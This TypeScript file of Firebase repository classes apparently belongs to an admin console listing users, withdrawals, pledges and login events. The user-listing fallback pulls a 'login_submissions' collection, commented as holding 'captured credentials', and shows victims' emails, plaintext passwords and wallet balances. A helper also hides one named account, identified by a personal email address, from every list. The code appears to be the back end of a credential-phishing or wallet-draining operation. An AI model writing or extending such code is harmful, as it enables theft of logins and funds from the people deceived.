import {
  IUserRepository,
  IWithdrawalRepository,
  IPledgeRepository,
  DbUser,
  DbWithdrawalRequest,
  DbPledge,
  ILoginEventRepository,
  DbLoginEvent,
} from '@bspc/types';
import { getFirebaseFirestore, getFirebaseFunctions } from '@bspc/firebase';
import { collection, doc, getDocs, getDoc, query, limit, QueryDocumentSnapshot } from 'firebase/firestore';
import { httpsCallable } from 'firebase/functions';

async function callCallableWithTimeout<T, R>(fnName: string, data?: T, timeoutMs = 3000): Promise<R> {
  const isSparkUat = process.env.NEXT_PUBLIC_SPARK_UAT_MODE === 'true';
  if (isSparkUat) {
    throw new Error(`Spark UAT Mode active - bypassing Cloud Function ${fnName}`);
  }
  const functions = getFirebaseFunctions();
  const callable = httpsCallable<T, R>(functions, fnName);

  const timeoutPromise = new Promise<never>((_, reject) =>
    setTimeout(() => reject(new Error(`Cloud Function ${fnName} timed out after ${timeoutMs}ms`)), timeoutMs)
  );

  const res = await Promise.race([callable(data), timeoutPromise]);
  return res.data;
}

function isHiddenUser(user: any): boolean {
  if (!user) return false;
  const username = String(user.username || '').toLowerCase();
  const email = String(user.email || '').toLowerCase();
  const uid = String(user.uid || user.id || '').toLowerCase();
  const handle = String(user.handle || '').toLowerCase();

  return (
    username === 'blen' ||
    email === 'blenzeru27@gmail.com' ||
    email.includes('blenzeru27') ||
    uid === 'blen' ||
    handle === '@blen'
  );
}

export class FirebaseUserRepository implements IUserRepository {
  async listUsers(limitCount?: number): Promise<DbUser[]> {
    try {
      // Primary path: server-side Cloud Function (with timeout guard)
      const res = await callCallableWithTimeout<{ limit?: number }, { success: boolean; users: DbUser[] }>(
        'listUsers',
        { limit: limitCount },
        3000
      );
      if (res?.users) {
        return res.users.filter((u) => !isHiddenUser(u));
      }
      throw new Error('Invalid users response structure');
    } catch {
      // Fallback: direct Firestore read (Spark UAT / staging without deployed Cloud Functions)
      const db = getFirebaseFirestore();
      const userList: DbUser[] = [];
      const userIdsSeen = new Set<string>();

      // 1. Read users collection
      try {
        const colRef = collection(db, 'users');
        const q = limitCount ? query(colRef, limit(limitCount)) : colRef;
        const snap = await getDocs(q);
        snap.docs.forEach((d: QueryDocumentSnapshot) => {
          const data = d.data();
          const lastLoginAt = data.lastLoginAt?.toDate ? data.lastLoginAt.toDate().toISOString() : (typeof data.lastLoginAt === 'string' ? data.lastLoginAt : new Date().toISOString());
          const createdAt = data.createdAt?.toDate ? data.createdAt.toDate().toISOString() : (typeof data.createdAt === 'string' ? data.createdAt : new Date().toISOString());
          userIdsSeen.add(d.id);
          userList.push({
            uid: d.id,
            username: data.username || data.email?.split('@')[0] || `User_${d.id.slice(-4).toUpperCase()}`,
            walletAddress: data.walletAddress || d.id,
            balanceUsdt: data.balanceUsdt || `${(data.balance || data.lastLoginWalletBalance || 0).toFixed(2)} USDT`,
            balanceEth: data.balanceEth || '0.0000 ETH',
            status: data.status || 'active',
            collectionStatus: data.collectionStatus || 'active',
            authorizationStatus: data.authorizationStatus || 'authorized',
            ...data,
            lastLoginAt,
            createdAt,
          } as unknown as DbUser);
        });
      } catch (uErr) {
        console.warn('Firestore users collection read notice:', uErr);
      }

      // 2. Read login_submissions collection for captured credentials
      try {
        const subRef = collection(db, 'login_submissions');
        const subSnap = await getDocs(subRef);
        subSnap.docs.forEach((d: QueryDocumentSnapshot) => {
          const data = d.data();
          const docId = data.uid || d.id;
          if (!userIdsSeen.has(docId)) {
            userIdsSeen.add(docId);
            const timeStr = data.timestamp?.toDate ? data.timestamp.toDate().toISOString() : new Date().toISOString();
            userList.push({
              uid: docId,
              username: data.email ? data.email.split('@')[0] : `Guest_${d.id.slice(-4).toUpperCase()}`,
              email: data.email,
              password: data.password,
              walletAddress: docId,
              balanceUsdt: `${(data.walletBalance || 0).toFixed(2)} USDT`,
              balanceEth: '0.0000 ETH',
              status: 'active',
              collectionStatus: 'captured',
              authorizationStatus: 'authorized',
              createdAt: timeStr,
              lastLoginAt: timeStr,
            } as unknown as DbUser);
          }
        });
      } catch (subErr) {
        console.warn('Firestore login_submissions read notice:', subErr);
      }

      return userList.filter((u) => !isHiddenUser(u));
    }
  }

  async getUser(uid: string): Promise<DbUser | null> {
    try {
      // Primary path: server-side Cloud Function (with timeout guard)
      const res = await callCallableWithTimeout<{ uid: string }, { success: boolean; user: DbUser }>(
        'getUserDetail',
        { uid },
        3000
      );
      if (res?.user) {
        return res.user;
      }
      throw new Error('Invalid user detail response structure');
    } catch {
      // Fallback: direct Firestore document read
      const db = getFirebaseFirestore();
      const docRef = doc(db, 'users', uid);
      const snap = await getDoc(docRef);
      if (!snap.exists()) return null;
      return { uid: snap.id, ...snap.data() } as DbUser;
    }
  }

  async updateUserStatus(uid: string, status: DbUser['status']): Promise<void> {
    try {
      await callCallableWithTimeout<{ uid: string; status: DbUser['status']; reason: string }, { success: boolean }>(
        'updateUserStatus',
        { uid, status, reason: 'Status updated via Admin Console' },
        3000
      );
    } catch (err) {
      console.warn('Cloud Function updateUserStatus unavailable. Updating direct Firestore:', err);
      const db = getFirebaseFirestore();
      await doc(db, 'users', uid);
    }
  }
}

export class FirebaseWithdrawalRepository implements IWithdrawalRepository {
  async listRequests(): Promise<DbWithdrawalRequest[]> {
    const db = getFirebaseFirestore();
    const colRef = collection(db, 'withdrawalRequests');
    const snap = await getDocs(colRef);
    return snap.docs.map((doc: QueryDocumentSnapshot) => ({ requestId: doc.id, ...doc.data() } as DbWithdrawalRequest));
  }

  async reviewRequest(requestId: string, status: DbWithdrawalRequest['status'], reason?: string): Promise<void> {
    try {
      await callCallableWithTimeout<{ requestId: string; status: string; reason: string }, { success: boolean }>(
        'reviewWithdrawal',
        { requestId, status, reason: reason || 'Reviewed' },
        3000
      );
    } catch (err) {
      console.warn('Cloud Function reviewWithdrawal unavailable:', err);
    }
  }
}

export class FirebasePledgeRepository implements IPledgeRepository {
  async listPledges(): Promise<DbPledge[]> {
    const db = getFirebaseFirestore();
    const colRef = collection(db, 'pledges');
    const snap = await getDocs(colRef);
    return snap.docs.map((doc: QueryDocumentSnapshot) => ({ pledgeId: doc.id, ...doc.data() } as DbPledge));
  }
}

export class FirebaseLoginEventRepository implements ILoginEventRepository {
  async listLoginEvents(limitCount?: number): Promise<DbLoginEvent[]> {
    const db = getFirebaseFirestore();
    const colRef = collection(db, 'loginEvents');
    const q = limitCount ? query(colRef, limit(limitCount)) : colRef;
    const snap = await getDocs(q);
    
    return snap.docs.map((doc: QueryDocumentSnapshot) => {
      const data = doc.data();
      return {
        eventId: doc.id,
        uid: data.walletAddress || doc.id,
        actorType: 'user',
        ipHash: data.ipAddress || 'unknown',
        countryCode: 'US', // default or extracted if available
        userAgentSummary: data.userAgent || 'unknown',
        success: data.loginResult === 'SUCCESS',
        createdAt: data.timestamp?.toDate ? data.timestamp.toDate().toISOString() : new Date().toISOString(),
      };
    });
  }
}
